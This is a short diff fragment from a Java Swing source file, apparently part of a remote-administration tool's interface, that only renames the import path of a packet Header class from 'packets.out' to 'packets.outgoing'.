@@ -17,7 +17,7 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.table.DefaultTableModel;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.out.Header;
+import com.redpois0n.packets.outgoing.Header;
 import com.redpois0n.ui.frames.FrameRawSystemInfo;
 import com.redpois0n.ui.renderers.table.ComputerInfoTableRenderer;
 import com.redpois0n.utils.FlagUtils;
